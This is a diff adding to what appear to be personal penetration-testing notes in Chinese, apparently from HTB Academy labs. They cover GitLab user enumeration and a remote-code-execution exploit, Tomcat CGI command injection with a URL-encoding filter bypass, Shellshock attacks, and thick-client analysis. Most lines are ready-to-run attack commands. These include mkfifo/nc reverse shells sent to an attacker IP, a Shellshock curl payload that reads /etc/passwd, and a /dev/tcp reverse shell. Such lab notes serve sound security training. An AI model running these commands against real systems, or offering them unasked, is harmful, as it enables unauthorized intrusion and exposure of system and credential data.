@@ -137,7 +137,64 @@ osTicket:
 
   https://github.com/initstring/linkedin2username
 
+
 Gitlab:
   不建议对一个应用程序发起各种漏洞利用，如果没有办法枚举版本号（例如通过页面上的日期、第一次公开提交或注册用户），应该坚持搜寻机密信息，而不是盲目地对其尝试多种漏洞利用
 
+  /help      /explore            找信息，凭证
+
+  /users/sign_up      试taken username
+
+  https://tillsongalloway.com/finding-sensitive-information-on-github/index.html
+
+  ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt            BF username
+
+  python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '            Get shell
+
+  searchsploit -m ruby/webapps/49821.sh            
+  ./49821.sh --url http://gitlab.inlanefreight.local:8081 --userlist /opt/useful/seclists/Usernames/cirt-default-usernames.txt | grep exists            BF username
+
+  searchsploit -m ruby/webapps/49951.py
+  nc -nvlp 9001
+  python3 49951.py -t http://gitlab.inlanefreight.local:8081 -u HTBAcademy -p password123 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc PWNIP PWNPO >/tmp/f'            Get RCE
+
+
+Tomcat CGI:            CGI: Common Gateway Interface            https://www.w3.org/CGI/            其风险和低效率超过了好处，CGI 已经跟不上时代
+  ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
+  ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
+
+  http://10.129.204.227:8080/cgi/welcome.bat?&dir
+  http://10.129.204.227:8080/cgi/welcome.bat?&set            看环境变量
+  列表中如果看到 PATH 变量已被取消设置，尝试在请求中硬编码路径:
+    http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
+  过滤器可以通过对载荷 (payload) 进行 URL 编码 (URL-encoding) 来绕过:
+    http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+
+  gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+
+  curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi            返回etc/passwd
+
+  sudo nc -lvnp 7777
+  curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi            Get Shell
   
+
+Tick / Fat APP:
+  胖客户端比 Web 应用安全性更低：
+    不当的错误处理 (Improper Error Handling)。
+    硬编码的敏感数据 (Hardcoded sensitive data)。
+    DLL 劫持 (DLL Hijacking)。
+    缓冲区溢出 (Buffer Overflow)。
+    SQL 注入 (SQL Injection)。
+    不安全的存储 (Insecure Storage)。
+    会话管理 (Session Management)。
+
+  https://learn.microsoft.com/en-gb/sysinternals/downloads/procmon            process monitor
+
+  为了捕获这些文件，需要更改 Temp 文件夹的权限以禁止文件删除。
+  右键单击 C:\Users\Matt\AppData\Local\Temp 文件夹
+  在 属性 (Properties) -> 安全 (Security) -> 高级 (Advanced) -> cybervaca ->
+  禁用继承 (Disable inheritance) -> 将继承的权限转换为此对象的显式权限 (Convert inherited permissions into explicit permissions on this object) -> 编辑 (Edit) ->
+  显示高级权限 (Show advanced permissions) 下，我们取消选中 删除子文件夹和文件 (Delete subfolders and files) 和 删除 (Delete) 复选框。
+
+  x64dbg            show cpu map
+  De4Dot            decode .NET binary
